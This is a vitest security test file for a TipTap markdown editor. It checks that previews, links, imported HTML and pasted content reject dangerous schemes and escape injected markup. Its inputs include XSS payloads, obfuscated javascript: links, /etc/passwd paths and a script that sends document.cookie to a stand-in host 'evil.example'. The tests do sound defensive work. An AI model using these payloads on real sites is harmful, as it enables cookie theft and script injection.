import { Editor } from "@tiptap/core";
import { describe, expect, it, vi } from "vitest";
import { composed, inline } from "../markdown";
import { previewOf } from "../previews";
import { stripped } from "../ui/Editor";
import { previewing, type Reach } from "../ui/previewing";
import { asMarkdown, written } from "../ui/writing";

vi.mock("@tauri-apps/api/core", () => ({
  invoke: () => Promise.resolve(null),
  convertFileSrc: (at: string) => `asset://localhost/${at}`,
}));

const reach: Reach = {
  url: (at) => `asset://localhost/${at}`,
  weight: () => 10,
  title: () => "titulo",
};

const drawn = (content: string, how: Partial<Reach> = {}): HTMLElement => {
  const editor = new Editor({
    extensions: [...written(), previewing(() => ({ ...reach, ...how }))],
    content,
  });
  const dom = editor.view.dom as HTMLElement;
  const html = dom.innerHTML;
  const box = document.createElement("div");
  box.innerHTML = html;
  editor.destroy();
  return box;
};

describe("previewOf nunca trata como interno lo que sale de la máquina", () => {
  it("rechaza esquemas, rutas absolutas y UNC", () => {
    for (const href of [
      "file:///etc/passwd",
      "data:text/html,<script>alert(1)</script>",
      "javascript:alert(1)",
      "JavaScript:alert(1)",
      "  javascript:alert(1)  ",
      "vbscript:msgbox(1)",
      "blob:http://evil.example/x",
      "/etc/passwd",
      "/Users/yo/pelicula.mp4",
      "\\\\servidor\\compartido\\pelicula.mp4",
      "C:/Users/yo/pelicula.mp4",
      "c:pelicula.mp4",
      "//evil.example/pixel.mp4",
    ]) {
      expect(previewOf(href), href).toBeNull();
    }
  });

  it("una direccion de la web es una web, y nunca un archivo de aqui", () => {
    for (const href of ["http://evil.example/x.mp4", "https://evil.example/x.mp4"]) {
      expect(previewOf(href), href).toEqual({ as: "web", at: href, host: "evil.example" });
    }
  });

  it("el nombre del sitio sale de la direccion, no de lo que diga el texto", () => {
    expect(previewOf("https://www.github.com/rgdevment/Tisty")).toEqual({
      as: "web",
      at: "https://www.github.com/rgdevment/Tisty",
      host: "github.com",
    });
  });

  it("sí acepta rutas relativas con .., que quedan para que Rust las rechace", () => {
    expect(previewOf("../../../Users/yo/pelicula.mp4")).toEqual({
      as: "video",
      at: "../../../Users/yo/pelicula.mp4",
    });
    expect(previewOf("..\\..\\pelicula.mp4")).toEqual({
      as: "video",
      at: "..\\..\\pelicula.mp4",
    });
  });

  it("trata tisty:doc/ como interno antes de mirar si es un esquema", () => {
    expect(previewOf("tisty:doc/../../../etc/passwd")).toEqual({
      as: "doc",
      id: "../../../etc/passwd",
    });
    expect(previewOf("tisty:doc/")).toBeNull();
  });
});

describe("el DOM que construye previewing", () => {
  it("no deja escapar html desde el nombre del fichero", () => {
    const box = drawn("![x](<attachments/ab/%3Cimg%20src=x%20onerror=alert(1)%3E.pdf>)");

    expect(box.querySelector(".card-under")?.innerHTML).toBe("PDF · 10 B");
    expect(box.querySelector("[onerror]")).toBeNull();
    expect(box.querySelector('img[src="x"]')).toBeNull();
  });

  it("no deja escapar html desde el título de un documento", () => {
    const box = drawn("![x](<tisty:doc/mac0-0001>)", {
      title: () => "<img src=x onerror=alert(1)>",
    });

    expect(box.querySelectorAll(".card img").length).toBe(0);
    expect(box.querySelector("[onerror]")).toBeNull();
    expect(box.textContent).toContain("<img src=x onerror=alert(1)>");
  });

  it("el reproductor solo recibe la url que devuelve served, nunca el href", () => {
    const editor = new Editor({
      extensions: [
        ...written(),
        previewing(() => ({
          ...reach,
          url: (at) => (at === "attachments/ab/clip.mp4" ? "asset://localhost/real.mp4" : null),
        })),
      ],
      content: "![x](<attachments/ab/clip.mp4>)",
    });

    editor.view.dom
      .querySelector<HTMLElement>(".preview-play")
      ?.dispatchEvent(new MouseEvent("click", { bubbles: true }));

    expect(editor.view.dom.querySelector("video")?.getAttribute("src")).toBe(
      "asset://localhost/real.mp4",
    );
    editor.destroy();
  });

  it("no dibuja reproductor para un href remoto", () => {
    const box = drawn("![x](<https://evil.example/x.mp4>)");

    expect(box.querySelector(".preview-play")).toBeNull();
    expect(box.querySelector("video")).toBeNull();
    expect(box.querySelector("audio")).toBeNull();
  });
});

describe("los enlaces que TipTap acepta con protocols: [tisty]", () => {
  const href = (md: string): string | null => {
    const editor = new Editor({ extensions: written(), content: md });
    const dom = editor.view.dom as HTMLElement;
    const found = dom.querySelector("a")?.getAttribute("href") ?? null;
    editor.destroy();
    return found;
  };

  it("sigue rechazando javascript:, data: y file:", () => {
    expect(href("[x](javascript:alert(1))")).toBeNull();
    expect(href("[x](data:text/html,<script>alert(1)</script>)")).toBeNull();
    expect(href("[x](file:///etc/passwd)")).toBeNull();
    expect(href("[x](<jAvAsCrIpT:alert(1)>)")).toBeNull();
  });

  it("rechaza el javascript: que llega troceado en html crudo", () => {
    expect(href('<a href="java&#9;script:alert(1)">x</a>')).toBeNull();
    expect(href('<a href="&#106;avascript:alert(1)">x</a>')).toBeNull();
    expect(href('<a href="javascript&#58;alert(1)">x</a>')).toBeNull();
    expect(href('<a href=" javascript:alert(1)">x</a>')).toBeNull();
  });

  it("el tabulador que markdown-it convierte en %09 sí pasa, pero deja de ser un esquema", () => {
    expect(href("[x](<java\tscript:alert(1)>)")).toBe("java%09script:alert(1)");
  });

  it("acepta tisty: y las rutas internas", () => {
    expect(href("[x](<tisty:doc/mac0-0001>)")).toBe("tisty:doc/mac0-0001");
    expect(href("[x](<attachments/ab/cd.pdf>)")).toBe("attachments/ab/cd.pdf");
  });
});

describe("html crudo dentro de un documento importado", () => {
  it("no sobrevive al esquema del editor", () => {
    const editor = new Editor({
      extensions: written(),
      content:
        '<script>fetch("https://evil.example/"+document.cookie)</script>' +
        '<img src="https://evil.example/pixel.png" onerror="alert(1)">' +
        '<video src="https://evil.example/x.mp4" autoplay></video>' +
        '<iframe src="https://evil.example/"></iframe>' +
        '<a href="javascript:alert(1)">pincha</a>' +
        '<base href="https://evil.example/">' +
        '<form action="https://evil.example/"><input name=x></form>',
    });
    const html = (editor.view.dom as HTMLElement).innerHTML;
    const markdown = asMarkdown(editor);
    editor.destroy();

    expect(html).not.toContain("<script");
    expect(html).not.toContain("<iframe");
    expect(html).not.toContain("<video");
    expect(html).not.toContain("<base");
    expect(html).not.toContain("<form");
    expect(html).not.toContain("onerror");
    expect(html).not.toContain("javascript:");
    expect(markdown ?? "").not.toContain("javascript:");
  });

  it("pero una imagen remota sí queda en el documento y depende de la CSP", () => {
    const editor = new Editor({
      extensions: written(),
      content: "![p](https://evil.example/pixel.png)",
    });
    const html = (editor.view.dom as HTMLElement).innerHTML;
    editor.destroy();

    expect(html).toContain("https://evil.example/pixel.png");
  });

  it("un img crudo sí se convierte en imagen con el src que trae", () => {
    const editor = new Editor({
      extensions: written(),
      content: '<img src="../../../etc/passwd" onerror="alert(1)" onload="alert(2)">',
    });
    const html = (editor.view.dom as HTMLElement).innerHTML;
    editor.destroy();

    expect(html).toContain('src="../../../etc/passwd"');
    expect(html).not.toContain("onerror");
    expect(html).not.toContain("onload");
  });

  it("el filtro de pegado deja pasar http pero corta lo demás", () => {
    expect(stripped('<img src="https://evil.example/p.png">')).toContain("evil.example");
    expect(stripped('<img src="attachments/ab/cd.png">')).toContain("attachments");
    expect(stripped('<img src="file:///etc/passwd">')).toBe("");
    expect(stripped('<img src="/etc/passwd">')).toBe("");
  });
});

describe("markdown-it, que es lo que se pinta con innerHTML", () => {
  it("escapa el html crudo en vez de dejarlo entrar", () => {
    const html = composed("<img src=x onerror=alert(1)><script>alert(1)</script>");

    expect(html).not.toContain("<img");
    expect(html).not.toContain("<script");
    expect(html).toContain("&lt;img");
  });

  it("no deja un href javascript: ni un src de otro esquema marcado como interno", () => {
    expect(composed("[x](javascript:alert(1))")).not.toContain('href="javascript');
    expect(composed("[x](JAVASCRIPT:alert(1))")).not.toContain('href="JAVASCRIPT');
    expect(inline("![x](https://evil.example/p.png)")).toContain("https://evil.example/p.png");
    expect(inline("![x](attachments/ab/cd.png)")).toContain('src=""');
  });
});
